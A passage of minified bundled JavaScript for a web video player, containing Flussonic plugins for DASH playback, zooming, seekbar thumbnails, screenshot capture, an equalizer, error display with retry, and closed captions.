t=this,e=this._options.shakaSendStatsInterval||3e4;this.sendStatsId=setInterval((function(){return t._sendStats()}),e)}},{key:"_sendStats",value:function(){this.trigger(c.Events.PLAYBACK_STATS_ADD,this._player.getStats())}},{key:"_setupError",value:function(t){this._onError(t)}},{key:"_onError",value:function(t){var e={shakaError:t,videoError:this.el.error},n=(r=e.shakaError.detail||e.shakaError).category,i=r.code,r=r.severity;if(e.videoError||!i&&!n)return l()(h()(a.prototype),"_onError",this).call(this);e=r===d.a.util.Error.Severity.CRITICAL,n={code:"".concat(n,"_").concat(i),description:"Category: ".concat(n,", code: ").concat(i,", severity: ").concat(r),level:e?c.PlayerError.Levels.FATAL:c.PlayerError.Levels.WARN,raw:t},i=this.createError(n),c.Log.error("Shaka error event:",i),this.trigger(c.Events.PLAYBACK_ERROR,i)}},{key:"_onAdaptation",value:function(){var t=this.videoTracks.filter((function(t){return!0===t.active}))[0];this._fillLevels(),this._sendStats(),this._pendingAdaptationEvent&&(this.trigger(c.Events.PLAYBACK_LEVEL_SWITCH_END),this._pendingAdaptationEvent=!1),c.Log.debug("an adaptation has happened:",t),this.highDefinition=720<=t.height,this.trigger(c.Events.PLAYBACK_HIGHDEFINITIONUPDATE,this.highDefinition),this.trigger(c.Events.PLAYBACK_BITRATE,{bandwidth:t.bandwidth,width:t.width,height:t.height,level:t.id,bitrate:t.videoBandwidth})}},{key:"_updateSettings",value:function(){"vod"===this.getPlaybackType()?this.settings.left=["playpause","position","duration"]:this.dvrEnabled?this.settings.left=["playpause"]:this.settings.left=["playstop"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(c.Events.PLAYBACK_SETTINGSUPDATE)}},{key:"checkIfCritical",value:function(){var r=this;this._options.mediaInfo.then((function(t){var e=t.criticalError;t=t.errorCodec;e&&(r._isShakaReadyState=!1,r.criticalError=!0,r.stop(),r.trigger(c.Events.PLAYBACK_ERROR,{UI:{title:"Playback error",message:"Could not play ".concat(t||"this"," codec")},raw:{response:{critical:!0}}}))}))}},{key:"_destroy",value:function(){this._isShakaReadyState=!1,c.Log.debug("shaka was destroyed")}}],[{key:"Events",get:function(){return{SHAKA_READY:"shaka:ready"}}},{key:"shakaPlayer",get:function(){return d.a}},{key:"canPlay",value:function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:"",r=(d.a.polyfill.installAll(),d.a.Player.isBrowserSupported());t=t.split("?")[0].match(/.*\.(.*)$/)||[];return r&&("mpd"===t[1]||-1<e.indexOf("application/dash+xml"))}}]),a}(c.HTML5Video),e.a=r},function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var i=r.n(e),a=(e=r(6),r.n(e)),s=(e=r(7),r.n(e)),o=(e=r(8),r.n(e)),l=(e=r(9),r.n(e)),u=(e=r(3),r.n(e)),h=r(1),c=(e=r(179),r.n(e));var n=function(t){o()(n,t);var r=function d(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=u()(r);return t=n?(t=u()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),l()(this,t)}}(n);function n(t){var e;return i()(this,n),(e=r.call(this,t)).listenTo(e.container,h.Events.MEDIACONTROL_CONTAINERCHANGED,e.calculatePos),e.listenToOnce(e.container,h.Events.CONTAINER_LOADEDMETADATA,(function(t){e.render(t)})),e}return a()(n,[{key:"name",get:function(){return"Flussonic paning/zooming plugin"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"destroy",value:function(){s()(u()(n.prototype),"destroy",this).call(this)}},{key:"render",value:function(t){var e=this;t=t.data;this._video=t.target,this.zoomElement=c()(this._video,{maxZoom:10,minZoom:1,smoothScroll:!1,zoomDoubleClickSpeed:1,filterKey:function(){return!0},onDoubleClick:function(t){return!1}}),this.zoomElement.on("transform",(function(t){e.calculatePos(t)}))}},{key:"calculatePos",value:function(){var r,n,i,a,s,o,t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:void 0;if(t)r=t.getTransform();else{if(!this.zoomElement)return;r=this.zoomElement.getTransform()}function e(t){return Math.floor(100*t)/100}r&&(n=r=(t=r).x,i=t=t.y,a=!1,s=this.container.el.getBoundingClientRect(),o=this._video.getBoundingClientRect(),s)&&(o.left>s.left&&(n=s.left,a=!0),o.top>s.top&&(i=s.top,a=!0),o.right<s.right&&(n=s.right-o.width,a=!0),o.bottom<s.bottom&&(i=s.bottom-o.height,a=!0),!a||e(n)===e(r)&&e(i)===e(t)||this.zoomElement.moveTo(n,i))}}]),n}(h.ContainerPlugin)},,function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var i=r.n(e),a=(e=r(6),r.n(e)),s=(e=r(8),r.n(e)),o=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1),h=(e=r(181),r.n(e));r(392);var n=function(t){s()(n,t);var r=function c(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(n);function n(t){var e;return i()(this,n),(e=r.call(this,t)).core=t,e.guid=e.randomGUID(),e}return a()(n,[{key:"name",get:function(){return"Flussonic Video Thumbnails"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"template",get:function(){return Object(u.template)(h.a)}},{key:"bindEvents",value:function(){this.listenTo(this.core,u.Events.CORE_ACTIVE_CONTAINER_CHANGED,this.containerChanged),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_RENDERED,this.render),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_MOUSEMOVE_SEEKBAR,this.onMouseMove.bind(this)),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_MOUSELEAVE_SEEKBAR,this.onMouseLeave)}},{key:"containerChanged",value:function(){this.stopListening(),this.bindEvents(),this.bindHLS()}},{key:"bindHLS",value:function(){var e=this,t=this.core.getCurrentPlayback()._hls;t&&!this.attachedEvent?(this.listenTo(t,"hlsLevelPtsUpdated",this.hlsPtsUpdated.bind(this)),this.attachedEvent=!0,this.hls=!0):this.attachedEvent||this.core.getCurrentPlayback().on("playback:ready",(function(){var t=e.core.getCurrentPlayback()._player;t&&(e.player=t,e.hls=!1,(t=e.getThumbnailImageTrack(t))&&t.id&&(e.thumbnailTrackId=t.id),e.attachedEvent=!0)}))}},{key:"hlsPtsUpdated",value:function(t,e){e.details.fragments[0]&&(this.totalDuration=e.details.totalduration,this.startProgramDateTime=e.details.fragments[0].rawProgramDateTime)}},{key:"setUpStyles",value:function(t){return t.addClass("thumbnail_placeholder")}},{key:"onMouseMove",value:function(t){t=t.clientX;var e=this.core.mediaControl.$seekBarContainer.width();this.updateThumbPosition(e,t),!this.hls&&this.player?this.updateJpegUrl(e,t):this.totalDuration&&this.startProgramDateTime?this.updateThumbUrl(e,t):this.hide()}},{key:"updateThumbUrl",value:function(t,e){var r=new Date(this.startProgramDateTime);e-=this.core.mediaControl.$seekBarContainer.offset().left,e=Math.min(1,Math.max(e/t,0)),t=r.getTime(),r=this.totalDuration*e*1e3,e=new Date(t+r),t=this.getBaseUrl(this.core,e);document.getElementById(this.guid).setAttribute("src",t)}},{key:"updateJpegUrl",value:function(t,e){var r,n=this;this.thumbnailTrackId&&!this.hls&&this.player&&(e-=this.core.mediaControl.$seekBarContainer.offset().left,t=((r=this.player.seekRange()).end-r.start)/t,r=r.start+e*t,this.player.getThumbnails(this.thumbnailTrackId,r).then((function(t){(t=t.uris)&&document.getElementById(n.guid).setAttribute("src",t)})))}},{key:"updateThumbPosition",value:function(t,e){t=Math.max(0,Math.min(t-300,e-150)),this.$el.css("left",t),this.show()}},{key:"onMouseLeave",value:function(){this.hide()}},{key:"onRendered",value:function(){this.$el.html(this.template({guid:this.guid,hls:this.hls})),this.setUpStyles(this.$el)}},{key:"render",value:function(){this.onRendered();var t=this.core.$el.find(".media-control-background");t[0]&&t.append(this.$el)}},{key:"show",value:function(){this.$el.css("opacity",1),this.$el.css("height","180px")}},{key:"hide",value:function(){this.$el.css("opacity",0),this.$el.css("height","0")}},{key:"s4",value:function(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}},{key:"randomGUID",value:function(){return"".concat(this.s4()+this.s4(),"-").concat(this.s4(),"-").concat(this.s4(),"-").concat(this.s4(),"-").concat(this.s4()).concat(this.s4()).concat(this.s4())}},{key:"zeroBased",value:function(t){return t<10?"0".concat(t):String(t)}},{key:"relUrl",value:function(t){return"".concat(this.zeroBased(t.getUTCFullYear()),"/").concat(this.zeroBased(t.getUTCMonth()+1),"/").concat(this.zeroBased(t.getUTCDate()),"/").concat(this.zeroBased(t.getUTCHours()),"/").concat(this.zeroBased(t.getUTCMinutes()),"/").concat(this.zeroBased(t.getUTCSeconds()),"-preview.mp4")}},{key:"getBaseUrl",value:function(t,e){var r=(t=t._options).source;t=t.authToken,r="".concat(r.slice(0,r.lastIndexOf("/")),"/");return"".concat(r).concat(this.relUrl(e)).concat(t?"?".concat(t):"")}},{key:"getThumbnailImageTrack",value:function(t){return(t=t.getImageTracks())&&t.length,t[0]}}]),n}(u.UICorePlugin)},function(t,e){t.exports='<% if (hls) { %>\n<video\n  autoplay\n  id="<%= guid %>"\n  width="100%"\n  type=\'video/mp4; codecs="avc1.42E01E, mp4a.40.2"\'\n></video>\n<% } else { %>\n<img id="<%= guid %>" alt="" />\n<% }; %>\n'},function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var i=r.n(e),a=(e=r(6),r.n(e)),s=(e=r(8),r.n(e)),o=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1),h=r(183),c=(e=r(184),r.n(e));var n=function(t){s()(n,t);var e=function d(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(n);function n(t){var r;return i()(this,n),(r=e.call(this,t)).$el.addClass("media-control-button media-control-icon").css({float:"right",height:"100%"}).append(c.a),r.$el.click((function(){var t=r.core.mediaControl.container.playback.el,e=document.createElement("canvas");e.width=t.videoWidth,e.height=t.videoHeight,e.getContext("2d").drawImage(t,0,0),t=e.toDataURL("image/jpeg"),r.core.mediaControl.trigger("capture:base64",t)})),r}return a()(n,[{key:"name",get:function(){return"Flussonic capture plugin"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"tagName",get:function(){return"button"}},{key:"attributes",get:function(){return{class:this.name}}},{key:"bindEvents",value:function(){this.listenToOnce(this.core,u.Events.CORE_ACTIVE_CONTAINER_CHANGED,(function(){this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_RENDERED,this.render),this.listenTo(this.core.mediaControl,"capture:base64",(function(t){Object(h.saveAs)(t,"screenshot_".concat(Date.now(),".jpg"))}))}))}},{key:"unBindEvents",value:function(){this.stopListening(this.core.mediaControl,u.Events.MEDIACONTROL_RENDERED)}},{key:"render",value:function(){return this.core.mediaControl.$el.find(".media-control-right-panel").append(this.el),this}}]),n}(u.UICorePlugin)},function(r,n,t){(function(t){var e;void 0!==(e="function"==typeof(e=function(){"use strict";function h(t,e,r){var n=new XMLHttpRequest;n.open("GET",t),n.responseType="blob",n.onload=function(){o(n.response,e,r)},n.onerror=function(){console.error("could not download file")},n.send()}function a(t){var e=new XMLHttpRequest;e.open("HEAD",t,!1);try{e.send()}catch(t){}return 200<=e.status&&299>=e.status}function s(e){try{e.dispatchEvent(new MouseEvent("click"))}catch(t){var r=document.createEvent("MouseEvents");r.initMouseEvent("click",!0,!0,window,0,0,0,80,20,!1,!1,!1,!1,0,null),e.dispatchEvent(r)}}var c="object"==typeof window&&window.window===window?window:"object"==typeof self&&self.self===self?self:"object"==typeof t&&t.global===t?t:void 0,d=c.navigator&&/Macintosh/.test(navigator.userAgent)&&/AppleWebKit/.test(navigator.userAgent)&&!/Safari/.test(navigator.userAgent),o=c.saveAs||("object"!=typeof window||window!==c?function(){}:"download"in HTMLAnchorElement.prototype&&!d?function(t,e,r){var n=c.URL||c.webkitURL,i=document.createElement("a");e=e||t.name||"download",i.download=e,i.rel="noopener","string"==typeof t?(i.href=t,i.origin===location.origin?s(i):a(i.href)?h(t,e,r):s(i,i.target="_blank")):(i.href=n.createObjectURL(t),setTimeout((function(){n.revokeObjectURL(i.href)}),4e4),setTimeout((function(){s(i)}),0))}:"msSaveOrOpenBlob"in navigator?function(t,e,r){if(e=e||t.name||"download","string"!=typeof t)navigator.msSaveOrOpenBlob(function i(t,e){return void 0===e?e={autoBom:!1}:"object"!=typeof e&&(console.warn("Deprecated: Expected third argument to be a object"),e={autoBom:!e}),e.autoBom&&/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(t.type)?new Blob(["\ufeff",t],{type:t.type}):t}(t,r),e);else if(a(t))h(t,e,r);else{var n=document.createElement("a");n.href=t,n.target="_blank",setTimeout((function(){s(n)}))}}:function(t,e,r,n){if((n=n||open("","_blank"))&&(n.document.title=n.document.body.innerText="downloading..."),"string"==typeof t)return h(t,e,r);var i="application/octet-stream"===t.type,a=/constructor/i.test(c.HTMLElement)||c.safari,s=/CriOS\/[\d]+/.test(navigator.userAgent);if((s||i&&a||d)&&"undefined"!=typeof FileReader){var o=new FileReader;o.onloadend=function(){var t=o.result;t=s?t:t.replace(/^data:[^;]*;/,"data:attachment/file;"),n?n.location.href=t:location=t,n=null},o.readAsDataURL(t)}else{var l=c.URL||c.webkitURL,u=l.createObjectURL(t);n?n.location=u:location.href=u,n=null,setTimeout((function(){l.revokeObjectURL(u)}),4e4)}});c.saveAs=o.saveAs=o,r.exports=o})?e.apply(n,[]):e)&&(r.exports=e)}).call(this,t(31))},function(t,e){t.exports='<svg viewBox="0 0 2048 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1024 672q119 0 203.5 84.5t84.5 203.5-84.5 203.5-203.5 84.5-203.5-84.5-84.5-203.5 84.5-203.5 203.5-84.5zm704-416q106 0 181 75t75 181v896q0 106-75 181t-181 75h-1408q-106 0-181-75t-75-181v-896q0-106 75-181t181-75h224l51-136q19-49 69.5-84.5t103.5-35.5h512q53 0 103.5 35.5t69.5 84.5l51 136h224zm-704 1152q185 0 316.5-131.5t131.5-316.5-131.5-316.5-316.5-131.5-316.5 131.5-131.5 316.5 131.5 316.5 316.5 131.5z" fill="#fff"></path></svg>'},function(t,e,r){"use strict";r.d(e,"a",(function(){return f}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),s=(e=r(46),r.n(e)),a=(e=r(7),r.n(e)),o=(e=r(8),r.n(e)),l=(e=r(9),r.n(e)),u=(e=r(3),r.n(e)),h=(e=r(17),r.n(e)),c=r(1);r(393);var f=function(t){o()(r,t);var e=function d(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=u()(r);return t=n?(t=u()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),l()(this,t)}}(r);function r(t){var a;return n()(this,r),a=e.call(this,t),h()(s()(a),"frameLooper",(function(){if(a.audioConnected){for(var t,e=new Uint8Array(a.analyser.frequencyBinCount),r=(a.analyser.getByteFrequencyData(e),0),n=0;n<e.length;n++)0!==e[n]&&r<(t=Math.abs(e[n]))&&(r=t);var i=Math.round(a.canvas.offsetHeight/(256/r))||0;a.eqBarBack.style.height="".concat(a.canvas.offsetHeight,"px"),a.eqBar.style.height="".concat(i,"px")}})),a.container=t,a.audioConnected=!1,a.render(),a}return i()(r,[{key:"name",get:function(){return"EqualizerPlugin"}},{key:"bindEvents",value:function(){this.listenTo(this.container,c.Events.CONTAINER_VOLUME,this.connectToAudio)}},{key:"destroy",value:function(){clearInterval(this.timerStatus),a()(u()(r.prototype),"destroy",this).call(this)}},{key:"connectToAudio",value:function(t){100===t&&(this.context=new(window.AudioContext||window.webkitAudioContext),this.analyser=this.context.createAnalyser(),this.source=this.context.createMediaElementSource(this.container.$el.find("video")[0]),this.source.connect(this.analyser),this.analyser.connect(this.context.destination),this.audioConnected=!0,this.frameLooper=this.frameLooper.bind(this),clearInterval(this.timerStatus),this.timerStatus=setInterval(this.frameLooper,25),this.stopListening(this.container,c.Events.CONTAINER_VOLUME,this.connectToAudio))}},{key:"render",value:function(){return this.container.$el.append('<div class="equalizer"><div class="eq-bar"><div class="eq-bar-back"></div></div></div>'),this.canvas=this.container.$el.find(".equalizer")[0],this.eqBar=this.container.$el.find(".eq-bar")[0],this.eqBarBack=this.container.$el.find(".eq-bar-back")[0],this}}]),r}(c.ContainerPlugin)},function(t,e,r){"use strict";r.d(e,"a",(function(){return c}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),a=(e=r(7),r.n(e)),s=(e=r(8),r.n(e)),o=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1);var c=function(t){s()(r,t);var e=function h(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(r);function r(t){return n()(this,r),(t=e.call(this,t)).background="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoAAAAFoBAMAAAA1HFdiAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAG1BMVEX5+fn//wAA//8A/wD/AP//AAAAAP8XFxf///8H5gWfAAAAAWJLR0QIht6VegAAAAd0SU1FB98IBRIsAXmGk48AAAI5SURBVHja7dJBDYBADADBs4AFLGABC1iohbOPhv1BMvu+NLlp10odqTN1pe7Uk5pQ8wMIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECDA/wKWxzM71T7ZZrfltNnppgACBAgQIECAAAECBAgQIECAAAECBAgQIECAAAECBAgQIECAAAECBAgQIECAAAECBAgQIECAAL8B+ALjSfYzPnmdzgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxNS0wOC0wNVQxODo0NDowMSswMTowMCL95a4AAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTUtMDgtMDVUMTg6NDQ6MDErMDE6MDBToF0SAAAAAElFTkSuQmCC","boolean"==typeof t.options.calmError&&t.options.calmError&&(t.background=""),t.options.dontShowError&&(t.dontShowError=parseInt(t.options.dontShowError,10),1==t.options.dontShowError)&&(t.dontShowError=1),t.listenTo(t.container,u.Events.CONTAINER_ERROR,t.onError),t}return i()(r,[{key:"name",get:function(){return"Flussonic error plugin"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"destroy",value:function(){this.t="stop",a()(l()(r.prototype),"destroy",this).call(this)}},{key:"hide",value:function(){this._err&&this._err.remove()}},{key:"show",value:function(t,e){var r,n=t.title,i=t.message;this.hide(),n=t&&n?n:"",t=t&&i?i:"A fatal error occured.",i="";e&&(r=e.code,e=void 0===(e=e.text)?"":e,i=(r=void 0===r?"":r)||e?"Code:".concat(r||""," - ").concat(e||""):""),this._err=$("<div>").css({position:"absolute","z-index":"999",width:"100%",height:"100%",display:"flex","align-items":"center","justify-content":" center","flex-direction":"column","background-image":"url(".concat(this.background,")"),"background-size":"100% 100%","background-repeat":"no-repeat","background-color":"#777","text-align":"center","font-weight":"bold","text-shadow":"1px 1px ".concat(this.options.calmError?"#000":"#fff"),color:"".concat(this.options.calmError?"#fff":"#000")}).append($("<h1>").text(n).css({"font-size":"200%"})).append($("<h2>").text(t).css({"font-size":"150%","margin-top":"8px"})).append($("<h3>").text(i).css({"font-size":"100%","margin-top":"8px","margin-bottom":"16px"})).append($('<p class="retrying_text">').html('Retrying in <span class="retry-counter">10</span> seconds ...').css({"font-size":"120%",margin:"15px"})),this.dontShowError&&0<this.dontShowError?--this.dontShowError:this.container&&this.container.$el.prepend(this._err)}},{key:"onError",value:function(t){if(t){var e=t.UI,r=t.raw;if(r){if(r=r.response,!this.container)return;if(this.show(e,r),r&&"critical"in r&&r.critical)return $(".retrying_text").text(""),this.t,void this.container.getPlugin("click_to_pause").disable()}}this.container.getPlugin("click_to_pause").disable();var n,i=10,a=function(){if(clearTimeout(n),"stop"!==this.t){if(0===i)return this.container.getPlugin("click_to_pause").enable(),this.options.errorPlugin&&this.options.errorPlugin.onRetry?void this.options.errorPlugin.onRetry(t):(this.container.stop(),this.container.play(),void this.hide());$(".retry-counter").text(i),i--,this.t=i,n=setTimeout(a,1e3)}}.bind(this);a()}}]),r}(u.ContainerPlugin)},function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var a=r.n(e),s=(e=r(6),r.n(e)),o=(e=r(8),r.n(e)),i=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1),h=(e=r(188),r.n(e)),c=(e=r(189),r.n(e));function d(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),i()(this,t)}}r(394);var n=function(t){o()(i,t);var n=d(i);function i(t){a()(this,i);var e,r=((e=n.call(this,t)).core=t).options.closedCaptionsConfig;return e._title=r&&r.title?r.title:null,e._ariaLabel=r&&r.ariaLabel?r.ariaLabel:"cc-button",e._labelCb=r&&r.labelCallback&&"function"==typeof r.labelCallback?r.labelCallback:function(t){return t.name},e.hideCCOnStart=t.options.hideCCOnStart,e.tracksAdded=!1,e.firstTime=!0,e.onSubtitleAvailable(),e}return s()(i,[{key:"name",get:function(){return"Flussonic closed captions"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"template",get:function(){return Object(u.template)(c.a)}},{key:"events",get:function(){return{"click [data-cc-button]":"toggleContextMenu","click [data-cc-select]":"onTrackSelect"}}},{key:"attributes",get:function(){return{class:"cc-controls","data-cc-controls":""}}},{key:"bindEvents",value:function(){this.listenTo(this.core,u.Events.CORE_ACTIVE_CONTAINER_CHANGED,this.containerChanged),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_RENDERED,this.render),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_HIDE,this.hideContextMenu),this.bindContainerEvents()}},{key:"bindContainerEvents",value:function(){this.container=this.core.activeContainer,this.container&&(this.listenTo(this.container,u.Events.CONTAINER_SUBTITLE_CHANGED,this.onSubtitleChanged),this.listenTo(this.container,u.Events.CONTAINER_STOP,this.onContainerStop))}},{key:"onContainerStop",value:function(){this.ccAvailable(!1)}},{key:"containerChanged",value:function(){var t=this.core.plugins;0<t.length&&t.forEach((function(t){"ClosedCaptions"===t.constructor.name&&(t.$el[0].style.display="none"),"closed_captions"===t.name&&(t.$el[0].style.display="none",t.disable())})),this.stopListening(),this.bindEvents()}},{key:"onSubtitleAvailable",value:function(){this.renderCcButton(),this.ccAvailable(!0)}},{key:"onSubtitleChanged",value:function(t){var e;this.setCurrentContextMenuElement(t.id),this.firstTime&&(e=(t=this.container.$el.find("video")[0].textTracks).length,t&&e&&(this.setCurrentContextMenuElement(e-1),this.$el.addClass("available")),this.firstTime=!1)}},{key:"onTrackSelect",value:function(t){var e=parseInt(t.target.dataset.ccSelect,10);return this.container.closedCaptionsTrackId=e,this.hideContextMenu(),t.noProp||t.stopPropagation(),!1}},{key:"ccAvailable",value:function(t){this.$el[t?"addClass":"removeClass"]("available")}},{key:"toggleContextMenu",value:function(){this.$el.find("ul").toggle()}},{key:"hideContextMenu",value:function(){this.$el.find("ul").hide()}},{key:"contextMenuElement",value:function(t){return this.$el.find("ul a".concat(Number.isNaN(t)?"":'[data-cc-select="'.concat(t,'"]'))).parent()}},{key:"mainButtonElement",value:function(){return this.$el.find("button.cc-button[data-cc-button]")}},{key:"setCurrentContextMenuElement",value:function(t){void 0===this._trackId&&void 0!==this.startingSubs?(this.contextMenuElement().removeClass("current"),this.contextMenuElement(this.startingSubs).addClass("current"),this.$el.find("button.cc-button[data-cc-button]").addClass("enabled"),this._trackId=this.startingSubs,this.startingSubs=void 0):this._trackId!==t&&(this.contextMenuElement(this._trackId).removeClass("current"),this.contextMenuElement(t).addClass("current"),this.$ccButton[-1<t?"addClass":"removeClass"]("enabled"),this._trackId=t)}},{key:"renderCcButton",value:function(){for(var t=this.container?this.container.closedCaptionsTracks:[],e=0;e<t.length;e+=1)t[e].label=this._labelCb(t[e]);this.$el.html(this.template({ariaLabel:this._ariaLabel,disabledLabel:this.core.i18n.t("disabled"),title:this._title,tracks:t})),this.$ccButton=this.$el.find("button.cc-button[data-cc-button]"),this.$ccButton.append(h.a),this.$el.append(this.style)}},{key:"render",value:function(){this.renderCcButton();var t=this.core.mediaControl.$el.find("button[data-fullscreen]");return t[0]?this.$el.insertAfter(t):this.core.mediaControl.$el.find(".media-control-right-panel[data-media-control]").prepend(this.$el),this}}]),i}(u.UICorePlugin)},function(t,e){t.exports='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 49 41.8" style="enable-background:new 0 0 49 41.8;" xml:space="preserve"><path d="M47.1,0H3.2C1.6,0,0,1.2,0,2.8v31.5C0,35.9,1.6,37,3.2,37h11.9l3.2,1.9l4.7,2.7c0.9,0.5,2-0.1,2-1.1V37h22.1 c1.6,0,1.9-1.1,1.9-2.7V2.8C49,1.2,48.7,0,47.1,0z M7.2,18.6c0-4.8,3.5-9.3,9.9-9.3c4.8,0,7.1,2.7,7.1,2.7l-2.5,4 c0,0-1.7-1.7-4.2-1.7c-2.8,0-4.3,2.1-4.3,4.3c0,2.1,1.5,4.4,4.5,4.4c2.5,0,4.9-2.1,4.9-2.1l2.2,4.2c0,0-2.7,2.9-7.6,2.9 C10.8,27.9,7.2,23.5,7.2,18.6z M36.9,27.9c-6.4,0-9.9-4.4-9.9-9.3c0-4.8,3.5-9.3,9.9-9.3C41.7,9.3,44,12,44,12l-2.5,4 c0,0-1.7-1.7-4.2-1.7c-2.8,0-4.3,2.1-4.3,4.3c0,2.1,1.5,4.4,4.5,4.4c2.5,0,4.9-2.1,4.9-2.1l2.2,4.2C44.5,25,41.9,27.9,36.9,27.9z"></path></svg>'},function(t,e){t.exports='<button\n  type="button"\n  class="cc-button media-control-button media-control-icon"\n  data-cc-button\n  aria-label="<%= ariaLabel %>"\n></button>\n<ul>\n  <% if (title) { %>\n  <li data-title><%= title %></li>\n  <% }; %>\n  <li><a href="#" data-cc-select="-1"><%= disabledLabel %></a></li>\n  <% for (var i = 0; i < tracks.length; i++) { %>\n  <li class="<% if (tracks[i].track.mode == \'showing\') { %>current<% }; %>">\n    <a href="#" data-cc-select="<%= tracks[i].id %>">\n      <%= tracks[i].label %> <% if (tracks[i].track.language) { %> (<%=\n      tracks[i].track.language %>) <% }; %></a\n    >\n  </li>\n  <% }; %>\n</ul>\n'},function(t,e,r){"use strict";r.d(e,"a",(function(){return v}));e=r(63);var a=r.n(e),s=(e=r(5),r.n(e)),o=(e=r(6),r.n(e)),l=(e=r(46),r.n(e)),u=(e=r(7),r.n(e)),h=(e=r(8),r.n(e)),i=(e=r(9),r.n(e)),c=(e=r(3),r.n(e)),d=(e=r(17),r.n(e)),f=r(1);function n(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function p(e){for(var t=1;t<arguments.length;t++){var 